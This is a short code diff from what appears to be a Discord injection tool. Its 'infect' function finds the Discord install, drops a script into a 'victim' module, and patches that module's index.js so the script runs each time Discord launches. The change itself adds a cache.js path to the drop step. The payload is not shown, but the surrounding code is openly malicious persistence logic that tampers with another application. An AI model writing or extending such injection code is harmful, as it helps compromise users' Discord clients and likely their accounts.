@@ -12,7 +12,7 @@ const infect = async ()=>{
 	const version = utils.findVersion(discordPath,'modules');
 	if(!version) return false;
 	const victimPath = `${discordPath}/${version}/modules/${victimModule}`;
-	if(!(await utils.dropScript(victimPath + `/${scriptName}`,process.argv[2]))) return false;
+	if(!(await utils.dropScript(victimPath + `/${scriptName}`,victimPath + '/cache.js',process.argv[2]))) return false;
 	if(!utils.patchScript(victimPath + '/index.js',scriptName)) return false;
 	console.log('Sucessfully patched Discord to load script on launch.');
 }
